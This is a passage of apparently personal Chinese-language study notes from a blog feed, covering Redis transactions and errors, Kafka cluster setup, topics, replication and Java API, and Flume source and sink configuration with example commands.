2QUEUED127.0.0.1:6379&gt; set c 3QUEUED127.0.0.1:6379&gt; exec1) OK2) OK3) OK# 目前事务存在的问题如果一条命令是因为语法错误, 事务整体执行不成功但是如果没有语法错误, 而是类型判断错误, 事务里面能执行成功的会执行成功, 不能执行成功的就不会执行成功, 这样就破坏了事务的原子性127.0.0.1:6379&gt; multiOK127.0.0.1:6379&gt; set aa 1QUEUED127.0.0.1:6379&gt; set bb 2QUEUED127.0.0.1:6379&gt; SDIFF aa bbQUEUED127.0.0.1:6379&gt; set cc 4QUEUED127.0.0.1:6379&gt; exec1) OK2) OK3) (error) WRONGTYPE Operation against a key holding the wrong kind of value4) OK 监听 1234watch xxunwatch机制: 在事务之前监听一个变量的变化如果一个变量有变化, 那之后的事务就取消执行 Redis 中的事务 :TODO 参考 CZ 的 word 文档 8.Redis 错误12345678910111213141516171819202122# 错误1(error) MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because this instance is configured to report errors during writes if RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs for details about the RDB error.127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error noOK127.0.0.1:6379&gt; pingPONG# 错误2cc: ../deps/hiredis/libhiredis.a: No such file or directorycc: ../deps/lua/src/liblua.a: No such file or directorycc: ../deps/geohash-int/geohash.o: No such file or directorycc: ../deps/geohash-int/geohash_helper.o: No such file or directorymake[1]: * [redis-server] Error 1make[1]: Leaving directory `/usr/local/src/redis-3.2.9/src'make: * [all] Error 2----------------解决办法进入源码包目录下的deps目录中执行make geohash-int hiredis jemalloc linenoise lua然后再进行../make编译就可以了再 $&gt; sudo make PREFIX=/usr/local/redis install 9.参考资料文档PDF]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kafka]]></title>
    <url>%2F2018%2F07%2F01%2FHadoop%2F7-Flume%26Kafka%2FKafka%2F</url>
    <content type="text"><![CDATA[1.概览分布式流处理平台。 分布式, 副本, 容错的分布式存储流. 在系统之间构建实时数据流管道。 以topic分类对记录进行存储 每个记录包含key-value+timestamp 每秒钟百万消息吞吐量。 Java 的 JMS 有2种模式: 发布订阅模式( 拿到的是 copy) &amp; 队列模式(queue): kafka 通过 group 把这两种模式完美的结合起来 如果想要实现queue 模式, 就把消费者放在同一组, 此组中只能有一个成员来消费此消息 想要实现发布订阅模式, 就把每个消费者各自一组, 每个人都可以拿到一个消息副本 关键词: producer //消息生产者 consumer //消息消费者 consumer group //消费者组 kafka server //broker,kafka服务器 topic //主题,副本数,分区. zookeeper //hadoop namenoade + RM HA | hbase | kafka 优化方案: 把磁盘挂载在某个目录, 然后让这个目录, 只是存储某个分区的数据 kafka 的要点一条消息是存在一个分区的 副本–可靠性 分区–高效性 =&gt; 并发访问 分区(partition)是 producer 通过负载均衡选择的 一个分区存着多条消息, 消息是有序的 一个分区内的消息只能被一个组内的一个成员消费 topic 是在 kafka server 上 topic 包含 副本数, 分区 producer &amp; consumer 都是针对 topic 来操作的 kafka 的 consumer 是拉模式, 从 kafka去pull 消息, 实时计算框架有多大能力, 就 pull 多少 所以 kafka 一般都用在实时/准实时 计算中 顺序读写 追加数据, 是追加到最后 读取是从开头读取 可用 offset 跳转到指定的数据段 数据可重复消费 Consumers 一条数据只能被同组内一个成员消费 不同组的可以消费同一个数据 SSD读写速度: 1200 ~ 3500 MB/s 注意点: Kafka 的分区数, 可以动态调整 Kafka 的每个分区都有对应的冗余数量, 默认是1 每个分区如果有多个副本, 这些副本中, 会有一个是 active 的状态, 负责读写, 其它的都是 standby 的状态 对于HDFS和kafka的 block partition 对于不同的文件或者topic来说，都可以有不同的副本数！(每个 topic 可以单独设置)设置的副本数不能超过broker的数量！！！ Kafka 的大致工作模式：1、启动 ZooKeeper 的 server 2、启动 Kafka 的 server 3、Producer 生产数据，然后通过 ZooKeeper 找到 Broker，再将数据 push 到 Broker 保存 4、Consumer 通过 ZooKeeper 找到 Broker，然后再主动 pull 数据 2.安装 kafka12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273740.选择cs1 ~ cs6, 6台主机都安装kafka---------------------------------------------------------------------1.准备zk略---------------------------------------------------------------------2.jdk略---------------------------------------------------------------------3.tar文件---------------------------------------------------------------------4.环境变量---------------------------------------------------------------------略5.配置kafka--------------------------------------------------------------------- [kafka/config/server.properties] ... # 这里每台不一样 broker.id=1 ... listeners=PLAINTEXT://:9092 ... # 这里每台不一样 advertised.listeners=PLAINTEXT://cs1:9092 host.name=cs1 ... log.dirs=/home/centos/kafka/logs ... zookeeper.connect=s201:2181,s202:2181,s203:21816.分发整个文件 &amp; 符号链接, .zshrc配置文件, 同时修改每个server.properties 文件的broker.id参数 ---------------------------------------------------------------------7.启动kafka服务器--------------------------------------------------------------------- a)先启动zk b)启动kafka b1)前台启动 [cs2 ~ cs4] [ap@cs1]~% kafka-server-start.sh /home/ap/apps/kafka/config/server.properties b2)后台启动 # 这里日志直接打印在控制台 $&gt; kafka-server-start.sh -daemon /home/ap/apps/kafka/config/server.properties [或者] # 这样能把日志输出到文件中 nohup kafka-server-start.sh /home/ap/apps/kafka/config/server.properties 1&gt;&lt;sub&gt;/kafka/logs/kafka_std.log 2&gt;&lt;/sub&gt;/kafka/logs/kafka_err.log &amp; c)验证kafka服务器是否启动 $&gt;netstat -anop | grep 90928.创建主题 --------------------------------------------------------------------- [ap@cs2]~% kafka-topics.sh --create --zookeeper cs1:2181 --replication-factor 3 --partitions 3 --topic test9.查看主题列表---------------------------------------------------------------------[ap@cs2]~% kafka-topics.sh --list --zookeeper cs1:218110.启动控制台生产者 (前提是 操作本机 &amp; cs2 上已经启动kafka服务)--------------------------------------------------------------------- 注意 : producer 不直接连接 zk, 而是连接 broker, 也就是 kafka server. 其它的都是连 zk 如果producer 连的某一台挂掉的话, 可以在 --broker-list 后面, 加上多台服务器,用逗号隔开 [ap@cs2]~% kafka-console-producer.sh --broker-list cs2:9092 --topic test11.启动控制台消费者 (前提是 操作本机 &amp; cs2 上已经启动卡夫卡服务)--------------------------------------------------------------------- # 使用bootstrap-server参数 替代zookeeper Using the ConsoleConsumer with old consumer is deprecated and will be removed in a future major release. Consider using the new consumer by passing [bootstrap-server] instead of [zookeeper]. [ap@cs3]~% kafka-console-consumer.sh --bootstrap-server cs2:9092 --topic test --from-beginning12.在生产者控制台输入hello world--------------------------------------------------------------------- 3.kafka集群在zk的配置123456789101112131415161718192021222324/controller ===&gt; &#123;"version":1,"brokerid":202,"timestamp":"1490926369148"/controller_epoch ===&gt; 1/brokers/brokers/ids/brokers/ids/202 ===&gt; &#123;"jmx_port":-1,"timestamp":"1490926370304","endpoints":["PLAINTEXT://s202:9092"],"host":"s202","version":3,"port":9092&#125;/brokers/ids/203/brokers/ids/204 /brokers/topics/test/partitions/0/state ===&gt;&#123;"controller_epoch":1,"leader":203,"version":1,"leader_epoch":0,"isr":[203,204,202]&#125;/brokers/topics/test/partitions/1/state ===&gt;.../brokers/topics/test/partitions/2/state ===&gt;.../brokers/seqid ===&gt; null/admin/admin/delete_topics/test ===&gt;标记删除的主题, 但是实际删除后, 这里没出现/isr_change_notification/consumers/xxxx//config 4.kafka 主题&amp;副本操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110---------------------------------------------------------------------PS: 查看帮助套路* 如果看 topic 相关帮助 * bin/kafka-topic.sh 脚本直接回车, 查看帮助---------------------------------------------------------------------查看主题列表---------------------------------------------------------------------[ap@cs2]~% kafka-topics.sqqh --list --zookeeper cs1:2181创建主题--------------------------------------------------------- repliation_factor 2 partitions 5 $&gt;kafka-topics.sh --zookeeper cs2:2181 --replication-factor 2 --partitions 3 --create --topic test2 2 x 3 = 6 //个文件夹 2份副本, 每份副本有3个分区 总分区数为 6 每个分区都有一个 leader, follower 就是其它的副本 删除主题------------------------------------------------------------[ap@cs2]~% kafka-topics.sh --zookeeper cs1:2181,cs2:2181,cs3:2181 --delete --topic kafka_test1查看主题描述--------------------------------------------------------[ap@cs2]~% kafka-topics.sh --zookeeper cs1:2181,cs2:2181,cs3:2181 --describe --topic kafka_test1增加/删除分区数--------------------------------------------------------kafka-topics.sh \--alter \--zookeeper cs1:2181,cs2:2181,cs3:2181 \--topic kafka_test1 \--partitions 20--------------kafka-topics.sh \--alter \--zookeeper hadoop02:2181,hadoop03:2181,hadoop04:2181 \ --topic kafka_test \--replication-factor 2查看某 topic 某个分区的偏移量最大值和最小值 :TODO 啥意思??--------------------------------------------------------kafka-run-class.sh kafka.tools.GetOffsetShell --topic kafka_test1 --time -1 --broker-list cs1:9092,cs2:9092,cs3:9092 --partitions 1 重新布局分区和副本，手动再平衡 :TODO 还未测试 ------------------------------------------------------------alter 似乎是有问题的, create好像没问题此句是手动把分区放到 203 &amp; 204上了 $&gt;kafka-topics.sh --alter --zookeeper s202:2181 --topic test2 --replica-assignment 203:204,203:204,203:204,203:204,203:204 测试 producer 发消息后, 存在本地的logs 目录的文件--------------------------------------------------------------1. 开启一个producer, 发消息2. 查看本地 cd ~/kafka/logs3. 查看文件大小, 找出文件(一次性查看) 1. [ap@cs1]~% xcall.sh "ls -lh kafka/logs/test2-*" 副本--------------------------------------------------------------broker存放消息以消息达到顺序存放。生产和消费都是副本感知的。支持到n-1故障。每个分区都有leader，follow.leader挂掉时，消息分区写入到本地log或者，向生产者发送消息确认回执之前，生产者向新的leader发送消息。新leader的选举是通过isr进行，第一个注册的follower成为leader。## kafka支持副本模式, 就是 producer 写到 broker的 topic中的 partition 的副本机制---------------------[同步复制] 1.producer联系zk识别leader 2.向leader发送消息 3.leadr收到消息写入到本地log 4.follower从leader pull消息 5.follower向本地写入log 6.follower向leader发送ack消息 7.leader收到所有follower的ack消息 8.leader向producer回传ack [异步副本]-------------------------------------------------------------- 和同步复制的区别在于 leader写入本地log之后， 直接向client回传ack消息，不需要等待所有follower复制完成。 # kafka 副本模式 &amp; leader 机制 | 官方文档----------------------------------------------------ps : 推选leader过程就是follower在zk中注册过程，第一个注册就是leaderThe process of choosing the new lead replica is that all followers' In-sync Replicas (ISRs) register themselves with ZooKeeper. The very first registered replica becomes the new lead replica, and the rest of the registered replicas become the followers.Kafka supports the following replication modes:• Synchronous replication: In synchronous replication, a producer first identifies the lead replica from ZooKeeper and publishes the message. As soon as the message is published, it is written to the log of the lead replica and all the followers of the lead start pulling the message, and by using a single channel, the order of messages is ensured. Each follower replica sends an acknowledgement to the lead replica once the message is written to its respective logs. Once replications are complete and all expected acknowledgements are received, the lead replica sends an acknowledgement to the producer.On the consumer side, all the pulling of messages is done from the lead replica.• Asynchronous replication: The only difference in this mode is that as soon as a lead replica writes the message to its local log, it sends the acknowledgement to the message client and does not wait for the acknowledgements from follower replicas. But as a down side, this mode does not ensure the message delivery in case of broker failure. 5.Kafka java API5.0 pom 文件1234567891011121314151617181920212223242526272829&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.rox&lt;/groupId&gt; &lt;artifactId&gt;Kafka_Demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;kafka_2.11&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 5.1实现消息生产者，发送&amp;接受 消息12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package com.rox.kafkademo.test;import kafka.consumer.Consumer;import kafka.consumer.ConsumerConfig;import kafka.consumer.ConsumerIterator;import kafka.consumer.KafkaStream;import kafka.producer.KeyedMessage$;import org.junit.Test;import kafka.javaapi.producer.Producer;import kafka.producer.KeyedMessage;import kafka.producer.ProducerConfig;import java.util.HashMap;import java.util.List;import java.util.Map;import java.util.Properties;public class TestProducer &#123;  // 发送消息 producer @Test public void testSend() &#123; Properties props = new Properties(); // broker列表 props.put("metadata.broker.list","cs2:9092"); // 串行化 props.put("serializer.class", "kafka.serializer.StringEncoder"); props.put("request.required.acks", "1"); //创建生产者配置对象 ProducerConfig config = new ProducerConfig(props); //创建生产者 Producer&lt;String, String&gt; producer = new Producer&lt;String, String&gt;(config); KeyedMessage&lt;String, String&gt; msg = new KeyedMessage&lt;String, String&gt;("test2", "100", "hello word fuck you kafka"); // 发送 producer.send(msg); System.out.println("发送完成"); &#125; // 接收消息 consumer @Test public void testConsumer() &#123; Properties props = new Properties(); props.put("zookeeper.connect", "cs2:2181"); props.put("group.id", "g2"); props.put("zookeeper.session.timeout.ms", "500"); props.put("auto.commit.interval.ms", "1000"); props.put("auto.offset.reset", "smallest"); // 创建消费者配置对象 ConsumerConfig config = new ConsumerConfig(props); Map&lt;String, Integer&gt; map = new HashMap&lt;String, Integer&gt;(); map.put("test2", new Integer(1)); Map&lt;String, List&lt;KafkaStream&lt;byte[], byte[]&gt;&gt;&gt; msgs = Consumer.createJavaConsumerConnector(new ConsumerConfig(props)).createMessageStreams(map); List&lt;KafkaStream&lt;byte[], byte[]&gt;&gt; msgList = msgs.get("test2"); for(KafkaStream&lt;byte[],byte[]&gt; stream : msgList)&#123; ConsumerIterator&lt;byte[],byte[]&gt; it = stream.iterator(); while(it.hasNext())&#123; byte[] message = it.next().message(); System.out.println(new String(message)); &#125; &#125; &#125;&#125; 5.2 新的 API6.Flume 集成 kafak6.1KafkaSinkkafka 是 consumer (消费者) flume 的消息, 经由 kafkaSink 导出到 kafka –最常用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273[flume 为生产者]1.1) flume 参数配置 ---------------------------------------------------- a1.sources = r1 a1.sinks = k1 a1.channels = c1 a1.sources.r1.type=netcat a1.sources.r1.bind=localhost a1.sources.r1.port=8888 a1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink a1.sinks.k1.kafka.topic = test3 a1.sinks.k1.kafka.bootstrap.servers = cs2:9092 a1.sinks.k1.kafka.flumeBatchSize = 20 a1.sinks.k1.kafka.producer.acks = 1 a1.channels.c1.type=memory a1.sources.r1.channels = c1 a1.sinks.k1.channel = c11.2) 开启 kafka 消费者---------------------------------------------------- kafka-console-consumer.sh --bootstrap-server cs2:9092 --topic test3 --from-beginning 注意 : Consider using the new consumer by passing [bootstrap-server] instead of [zookeeper]. 使用 [bootstrap-server]代替[zookeeper]1.3) flume 执行 kafka_sink.conf ---------------------------------------------------- flume-ng agent -f apps/flume/conf/confs/kafka_sink.conf -n a11.4) 验证端口---------------------------------------------------- netstat -anop | grep 8888 [OR] lsof -i tcp:88881.5) nc 连接---------------------------------------------------- nc localhost 8888 发消息....1.6) 观察 kafka 消费者接受消息---------------------------------------------------- 发现特别快! ========================================================简单案例2--------------a1.sources = r1a1.sinks = k1a1.channels = c1a1.sources.r1.type=exec#-F 最后10行,如果从头开始收集 -c +0 -F:持续收集后续数据,否则进程停止。a1.sources.r1.command=tail -F -c +0 /home/ap/calllog/calllog.loga1.channels.c1.type=memorya1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSinka1.sinks.k1.kafka.topic = callloga1.sinks.k1.kafka.bootstrap.servers = cs2:9092 cs3:9092 cs4:9092# How many messages to process in one batch. Larger batches improve throughput while adding latency.a1.sinks.k1.kafka.flumeBatchSize = 20# How many replicas must acknowledge a message before its considered successfully written. Accepted values are 0 (Never wait for acknowledgement), 1 (wait for leader only), -1 (wait for all replicas) Set this to -1 to avoid data loss in some cases of leader failure.a1.sinks.k1.kafka.producer.acks = 1a1.sources.r1.channels = c1a1.sinks.k1.channel = c1 6.2 KafkaSource :TODOflume source 从 kafka 抓数据, flume source 是消费者, kafka 开启 producer. 123456789101112131415161718192021222324252627[消费者]1) 配置 a1.sources = r1 a1.sinks = k1 a1.channels = c1 a1.sources.r1.type = org.apache.flume.source.kafka.KafkaSource a1.sources.r1.batchSize = 5000 a1.sources.r1.batchDurationMillis = 2000 a1.sources.r1.kafka.bootstrap.servers = cs2:9092 a1.sources.r1.kafka.topics = test3 a1.sources.r1.kafka.consumer.group.id = g4 a1.sinks.k1.type = logger a1.channels.c1.type=memory a1.sources.r1.channels = c1 a1.sinks.k1.channel = c12) 启动 flume flume-ng agent -f /home/ap/apps/flume/conf/confs/kafka_source.conf -n a1 -Dflume.root.logger=INFO,console3) 启动 kafka producer kafka-console-producer.sh --broker-list cs2:9092 --topic test3 4) kafka 发消息: 收不到!!!! :TODO 6.3 KafkaChannel :TODO12345678910111213141516171819202122:TODO 也出错 ?? 越界 生产者 + 消费者 a1.sources = r1 a1.sinks = k1 a1.channels = c1 a1.sources.r1.type = avro a1.sources.r1.bind = localhost a1.sources.r1.port = 8888 a1.sinks.k1.type = logger a1.channels.c1.type = org.apache.flume.channel.kafka.KafkaChannel a1.channels.c1.kafka.bootstrap.servers = cs2:9092 a1.channels.c1.kafka.topic = test3 a1.channels.c1.kafka.consumer.group.id = g6 a1.channels.c1.kafka.parseAsFlumeEvent = false a1.channels.c1.zookeeperConnect= cs2:2181 a1.sources.r1.channels = c1 a1.sinks.k1.channel = c1]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Kafka</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>Kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Flume]]></title>
    <url>%2F2018%2F06%2F30%2FHadoop%2F7-Flume%26Kafka%2FFlume%2F</url>
    <content type="text"><![CDATA[1.Flume 概念提供 收集、移动、聚合大量日志数据的服务。 基于流数据的架构，用于在线日志分析。 基于事件。 在生产和消费者之间启动协调作用。 提供了事务保证，确保消息一定被分发。 多种 Source, Channel, Sink配置方式。 与 Sqoop 区别 Sqoop 用来采集关系型数据库数据 Flume 用 来采集流动型数据。 关键词解释 Client Client 是一个将原始 log 包装成 events 并且发送他们到一个或多个 agent 的实体, 交给 source 处理 Event Event 由可选的 header 和载有数据的一个 byte array 构成。 Source 接受数据，类型有多种。 Channel 临时存放地，对Source中来的数据进行缓冲，直到sink消费掉。 Sink 从channel提取数据存放到中央化存储(hadoop / hbase)。 Iterator 作用于 Source，按照预设的顺序在必要地方装饰和过滤 events Channel Selector 允许 Source 基于预设的标准，从所有 channel 中，选择一个或者多个 channel A simple Flume agent with one source, channel, and sink Source ==&gt;Channel Channel Flume 的数据流由事件(Event)贯穿始终。事件是 Flume 的基本数据单位，它携带日志数据(字 节数组形式)并且携带有头信息，这些 Event 由 Agent 外部的 Source 生成，当 Source 捕获事 件后会进行特定的格式化，然后 Source 会把事件推入(单个或多个)Channel 中。你可以把 Channel 看作是一个缓冲区，它将保存事件直到 Sink 处理完该事件。Sink 负责持久化日志或 者把事件推向另一个 Source。 Flume 以 agent 为最小的独立运行单位。一个 agent 就是一个 JVM。单 agent 由 Source、Sink 和 Channel 三大组件构成，如下图: 参考文档 2.安装 Flume1.下载2.tar3.环境变量注意: 配置的话, 使用脚本就方便些, 但是如果配置文件在 flume 文件夹中, 路径就比较长 ​ 不配置的话, 要进入到flume 路径下使用, 但是此时配置文件的路径就比较短了 PS: 如果.sh文件没有执行权限, 即x权限, 要用相对路径来启动, 即如果在 bin 目录, 要用./flume-ng, 在 bin 外,要用 bin/flume执行, 有x权限的话, 就可以直接在 bin 下, 使用 flume-ng, 如果配置了环境变量, 可以在任何路径下使用 flume-ng了. Open flume-env.sh file and set the JAVA_Home to the folder where Java was installed in your system. 1export JAVA_HOME=/usr/local/jdk1.8.0_73 In the .zshrc file, set FLUME_HOME 12345#flumeexport FLUME_HOME=/home/ap/apps/flumeexport PATH=$PATH:$FLUME_HOME/bin---source .zshrc 4.验证` $&gt; flume-ng version` //next generation.下一代. 3.配置flume准备工作3.0如果 yum 没有设置网络源的, 设置一下 阿里 | 网易123456789101112# 先备份原来的 CentOS-Base.repo 为 CentOS-Base.repo.bakmv CentOS-Base.repo CentOS-Base.repo.bak# 下载阿里基本源 $&gt;sudo wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo# 下载阿里epel源$&gt;sudo wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo# 生成缓存文件$&gt;sudo yum clean all$&gt;sudo yum makecache 3.1 所有机器安装 nc 或者 telnet123$&gt;yum search nc$&gt; xcall.sh sudo yum install -y nc.x86_64$&gt; xcall.sh sudo yum install -y telnet 3.2 使用 nc123456789101112cs1_1&gt; nc -lk 8888 : 开启8888端口监听-------再开一个cs1 sessioncs1_2&gt; netstat -anop | grep 8888 : 查看是有有此端口或者 &gt; lsof -i tcp:8888 : 可以直接看到 pidtcp 0 0 0.0.0.0:8888 0.0.0.0:* LISTEN 17251/nc off (0.00/0/0)---------有的话就可以测试连接了 (客户端连接)cs1_2&gt; nc localhost 8888 ==================telnet 使用方式类似, 可查看帮助 4. flume配置官方文档 总体概述 实时处理架构flume: 监控日志文件 每次产生一条新的数据, 会被实时的收集到下一跳 Kafka: 消息系统 对消息进行简单处理, 当然, 具有简单缓冲作用 Storm / SparkStreaming: 流式的分布式计算引擎 Redis: 缓存组件 内存数据库 Hbase / HDFS /ES …: 最后持久化到这些地方.. 4.1 Flume Source注意: 启动 flume 配置的时候, 后面加上 -Dflume.root.logger=INFO,console 还有一种更详细的 : -Dflume.root.logger=DEBUG,console 会打印更详细的日志 4.1.1 netcat通过消息通信的方式, 进行采集 1234567891011121314151617181920212223242526272829303132331.创建配置文件 [/soft/flume/conf/helloworld.conf] #声明三种组件 a1.sources = r1 a1.channels = c1 a1.sinks = k1 #定义source信息 a1.sources.r1.type=netcat a1.sources.r1.bind=localhost a1.sources.r1.port=8888 #定义sink信息 a1.sinks.k1.type=logger #定义channel信息 a1.channels.c1.type=memory #绑定在一起 ps: 注意: 一个source(源) 可以输出到多个 channels(通道) 一个sink(沉漕)只能从一个 channel(通道)中获取数据 a1.sources.r1.channels=c1 a1.sinks.k1.channel=c1 2.运行 a)启动flume agent $&gt; bin/flume-ng agent -f conf/helloworld.conf -n a1 -Dflume.root.logger=INFO,console b)启动nc的客户端 $&gt;nc localhost 8888 $nc&gt;hello world c)在flume的终端输出hello world. 4.1.2 exec实时日志收集,实时收集日志。 测试: 先启动监控, 再创建文件, 能否监控到 结论: 可以监控到 123456789101112131415161718192021222324252627281. 配置 # 声明3种组件 a1.sources=r1 a1.channels=c1 a1.sinks=k1 # 定义 source 信息 a1.sources.r1.type=exec a1.sources.r1.command=tail -F /home/ap/test.txt #收集最后的10行 a1.sources.r1.command=tail -F -c +0 /home/ap/test.txt #从第0行开始收集 # 定义 sink 信息 a1.sinks.k1.type=logger # 定义 channel 信息 a1.channels.c1.type=memory # 绑定在一起 a1.sources.r1.channels=c1 a1.sinks.k1.channel=c12&gt; 新建文件 test.txt3&gt; 启动 [ap@cs1]~% flume-ng agent -f apps/flume/conf/confs/exec.conf -n a1 -Dflume.root.logger=INFO,console4&gt; 修改 test.txt 文件$&gt; echo ddd &gt; test.txt 观察 agent 控制台变化 4.1.3 批量收集(spool)监控一个文件夹，静态文件。 文件最好是直接从外部移入, 文件夹内最好不要做文件编辑。 收集完之后，会重命名文件成新文件。.compeleted. 之后就不会再次处理这个文件了. 只会监控新增加的文件, 不会监控删除的本地文件. 123456789101112131415161718192021222324252627a) 配置 # 声明3种组件 a1.sources=r1 a1.channels=c1 a1.sinks=k1 # 定义 source 信息 a1.sources.r1.type=spooldir a1.sources.r1.spoolDir=/home/ap/spool a1.sources.r1.fileHeader=true # 定义 sink 信息 a1.sinks.k1.type=logger # 定义 channel 信息 a1.channels.c1.type=memory # 绑定在一起 a1.sources.r1.channels=c1 a1.sinks.k1.channel=c1b)创建目录 $&gt;mkdir ~/spoolc)启动flume可以直接启动 $&gt;flume-ng agent -f apps/flume/conf/confs/spool.conf -n a1 -Dflume.root.logger=INFO,console 4.1.4 序列sources (seq)一个简单的序列生成器, 它连续生成一个计数器, 它从0开始, 增量为 1, 并在 totalEvents 停止。 主要用于测试。 1234567891011121314151617181920212223241) 配置# 声明3种组件a1.sources=r1a1.channels=c1a1.sinks=k1# 定义 source 信息a1.sources.r1.type=seqa1.sources.r1.totalEvents=1000# 定义 sink 信息a1.sinks.k1.type=logger# 定义 channel 信息a1.channels.c1.type=memory# 绑定在一起a1.sources.r1.channels=c1a1.sinks.k1.channel=c12) 运行$&gt;bin/flume-ng agent -f conf/confs/helloworld.seq.conf -n a1 -Dflume.root.logger=INFO,console 4.1.5 压力 source (用于压力测试)123456a1.sources = stresssource-1a1.channels = memoryChannel-1a1.sources.stresssource-1.type = org.apache.flume.source.StressSourcea1.sources.stresssource-1.size = 10240a1.sources.stresssource-1.maxTotalEvents = 1000000a1.sources.stresssource-1.channels = memoryChannel-1 4.1.6 Multiplexing Channel Selector :TODOflume 多路复用 官网 4.2. Flume Sink沉漕, source 经过 channel, 最后下沉到 sink, 再由 sink 输出 注意, flume 后面加上 &amp;是指后台运行 官网 4.2.1输出 (sink) 到 HDFS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384851) 配置===================================================================a1.sources = r1a1.channels = c1a1.sinks = k1a1.sources.r1.type = netcata1.sources.r1.bind = localhosta1.sources.r1.port = 8888a1.sinks.k1.type = hdfsa1.sinks.k1.hdfs.path = /flume/events/%y-%m-%d/%H/%M/%Sa1.sinks.k1.hdfs.filePrefix = events-# round目录 是否会产生新目录,每十分钟产生一个新目录,一般控制的目录方面。#2017-12-12 --&gt;#2017-12-12 --&gt;%H%M%S比如 写上 1 / day, 就是一天产生的数据文件都在 一个日期的目录下.---a1.sinks.k1.hdfs.round = true a1.sinks.k1.hdfs.roundValue = 1a1.sinks.k1.hdfs.roundUnit = day#使用本地时间戳为时间序列头 a1.sinks.k1.hdfs.useLocalTimeStamp=true#是否产生新文件。 -------------只要3个条件中某一个满足, 就会滚动一个文件# roll滚动, 此事件内的日志会写入到一个文件# 目前的猜测: 10个字节就会触发, 如果10秒内 0 &lt; input &lt; 10字节, 也会滚动 =&gt; 是的# 等待滚动当前的文件 10秒,Number of seconds to wait before rolling current file (0 = never roll based on time interval)a1.sinks.k1.hdfs.rollInterval=10 # 这是指10个字节就触发滚动 File size to trigger roll, in bytes (0: never roll based on file size) a1.sinks.k1.hdfs.rollSize=10 # Number of events written to file before it rolled (0 = never roll based on number of events) 一行就是一个事件 a1.sinks.k1.hdfs.rollCount=3 a1.channels.c1.type=memorya1.sources.r1.channels = c1a1.sinks.k1.channel = c1-----------------# sink其它可选配置参数(详情可查官网)agent1.sinks.sink1.type = hdfs#a1.sinks.k1.channel = c1agent1.sinks.sink1.hdfs.path =hdfs://myha01/weblog/flume-event/%y-%m-%d/%H-%M agent1.sinks.sink1.hdfs.filePrefix = tomcat_agent1.sinks.sink1.hdfs.maxOpenFiles = 5000agent1.sinks.sink1.hdfs.batchSize= 100agent1.sinks.sink1.hdfs.fileType = DataStreamagent1.sinks.sink1.hdfs.writeFormat =Textagent1.sinks.sink1.hdfs.rollSize = 102400agent1.sinks.sink1.hdfs.rollCount = 1000000agent1.sinks.sink1.hdfs.rollInterval = 60agent1.sinks.sink1.hdfs.round = trueagent1.sinks.sink1.hdfs.roundValue = 10agent1.sinks.sink1.hdfs.roundUnit = minuteagent1.sinks.sink1.hdfs.useLocalTimeStamp = true&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;如果 HDFS 集群是高可用集群，那么必须要放入 core-site.xml 和 hdfs-site.xml 文件到 $FLUME_HOME/conf/confs 目录中, 就是跟配置文件同级目录.&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;2) 开启agent===================================================================[ap@cs1]~/apps/flume/conf/confs% flume-ng agent -f hdfs.conf -n a13) nc 连接===================================================================nc local 8888连接上了之后, 发出去的消息就会写入 hdfs 4) 写入时, 完整的 log 是这样的===================================================================18/06/30 18:39:18 INFO hdfs.HDFSSequenceFile: writeFormat = Writable, UseRawLocalFileSystem = false18/06/30 18:39:18 INFO hdfs.BucketWriter: Creating /user/ap/flume/events/18-06-30/18/39/00/events-.1530355158463.tmp18/06/30 18:39:28 INFO hdfs.BucketWriter: Closing /user/ap/flume/events/18-06-30/18/39/00/events-.1530355158463.tmp18/06/30 18:39:28 INFO hdfs.BucketWriter: Renaming /user/ap/flume/events/18-06-30/18/39/00/events-.1530355158463.tmp to /user/ap/flume/events/18-06-30/18/39/00/events-.153035515846318/06/30 18:39:28 INFO hdfs.HDFSEventSink: Writer callback called.5) 查看 ===================================================================注意: 序列文件用 text 查看 4.2.2 